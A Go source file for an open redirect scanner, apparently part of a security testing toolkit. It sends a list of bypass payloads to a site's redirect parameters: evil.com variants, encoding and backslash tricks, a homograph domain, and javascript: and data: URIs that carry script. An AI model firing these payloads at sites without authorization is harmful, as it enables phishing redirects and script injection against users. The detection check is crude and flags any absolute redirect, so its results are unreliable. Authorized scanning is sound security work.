// Package openredirect provides Open Redirect testing
package openredirect

import (
	"context"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// Config configures open redirect testing
type Config struct {
	Concurrency int
	Timeout     time.Duration
	Headers     map[string]string
}

// DefaultConfig returns sensible defaults
func DefaultConfig() Config {
	return Config{
		Concurrency: 10,
		Timeout:     10 * time.Second,
	}
}

// Result represents an open redirect test result
type Result struct {
	URL         string
	Parameter   string
	Payload     string
	RedirectURL string
	StatusCode  int
	Vulnerable  bool
	Evidence    string
	Severity    string
	Timestamp   time.Time
}

// Scanner performs open redirect testing
type Scanner struct {
	config  Config
	client  *http.Client
	results []Result
	mu      sync.RWMutex
}

// NewScanner creates a new open redirect scanner
func NewScanner(config Config) *Scanner {
	if config.Concurrency <= 0 {
		config.Concurrency = 10
	}
	if config.Timeout <= 0 {
		config.Timeout = 10 * time.Second
	}

	return &Scanner{
		config: config,
		client: &http.Client{
			Timeout: config.Timeout,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
		results: make([]Result, 0),
	}
}

// Scan tests a URL for open redirect vulnerabilities
func (s *Scanner) Scan(ctx context.Context, targetURL string, params map[string]string) ([]Result, error) {
	results := make([]Result, 0)

	for param := range params {
		for _, payload := range Payloads() {
			testParams := make(map[string]string)
			for k, v := range params {
				testParams[k] = v
			}
			testParams[param] = payload

			result := s.testPayload(ctx, targetURL, param, payload, testParams)
			if result.Vulnerable {
				results = append(results, result)
			}
		}
	}

	s.mu.Lock()
	s.results = append(s.results, results...)
	s.mu.Unlock()

	return results, nil
}

// testPayload tests a single open redirect payload
func (s *Scanner) testPayload(ctx context.Context, targetURL, param, payload string, params map[string]string) Result {
	result := Result{
		URL:       targetURL,
		Parameter: param,
		Payload:   payload,
		Timestamp: time.Now(),
	}

	u, err := url.Parse(targetURL)
	if err != nil {
		return result
	}

	q := u.Query()
	for k, v := range params {
		q.Set(k, v)
	}
	u.RawQuery = q.Encode()

	req, err := http.NewRequestWithContext(ctx, "GET", u.String(), nil)
	if err != nil {
		return result
	}

	for k, v := range s.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()

	result.StatusCode = resp.StatusCode

	// Check for redirect
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		location := resp.Header.Get("Location")
		result.RedirectURL = location

		if s.isExternalRedirect(location, payload) {
			result.Vulnerable = true
			result.Evidence = "Redirects to external domain: " + location
			result.Severity = "MEDIUM"
		}
	}

	return result
}

// isExternalRedirect checks if redirect goes to attacker-controlled domain
func (s *Scanner) isExternalRedirect(location, payload string) bool {
	if location == "" {
		return false
	}

	// Check for attacker domains in payload
	attackerDomains := []string{
		"evil.com",
		"attacker.com",
		"malicious.com",
		"google.com", // Common test domain
	}

	locationLower := strings.ToLower(location)
	for _, domain := range attackerDomains {
		if strings.Contains(locationLower, domain) {
			return true
		}
	}

	// Check if it's an absolute URL to different domain
	if strings.HasPrefix(location, "//") || strings.HasPrefix(location, "http") {
		return true
	}

	return false
}

// GetResults returns all results
func (s *Scanner) GetResults() []Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return append([]Result{}, s.results...)
}

// Payloads returns open redirect test payloads
func Payloads() []string {
	return []string{
		// Basic
		"https://evil.com",
		"http://evil.com",
		"//evil.com",

		// Protocol-relative
		"//evil.com/",
		"///evil.com",
		"////evil.com",

		// Backslash tricks
		"\\evil.com",
		"\\/evil.com",
		"/\\evil.com",

		// Encoded
		"https:%2f%2fevil.com",
		"https:%252f%252fevil.com",
		"%2f%2fevil.com",

		// @ tricks
		"https://trusted.com@evil.com",
		"https://evil.com#@trusted.com",
		"https://evil.com?.trusted.com",

		// Unicode/homograph
		"https://еvil.com", // Cyrillic 'е'

		// Whitespace
		" //evil.com",
		"	//evil.com",
		"%09//evil.com",
		"%0d%0a//evil.com",

		// Data URI
		"data:text/html,<script>alert(1)</script>",

		// JavaScript (XSS via redirect)
		"javascript:alert(1)",
		"javascript://evil.com/%0aalert(1)",

		// Local redirect bypass
		"/\\evil.com",
		"/.evil.com",
		"/..;/evil.com",
	}
}

// CommonParameters returns common redirect parameters
func CommonParameters() []string {
	return []string{
		"url",
		"redirect",
		"redirect_url",
		"redirect_uri",
		"return",
		"return_url",
		"returnUrl",
		"next",
		"next_url",
		"goto",
		"target",
		"destination",
		"dest",
		"continue",
		"callback",
		"redir",
		"out",
		"view",
		"link",
		"ref",
	}
}
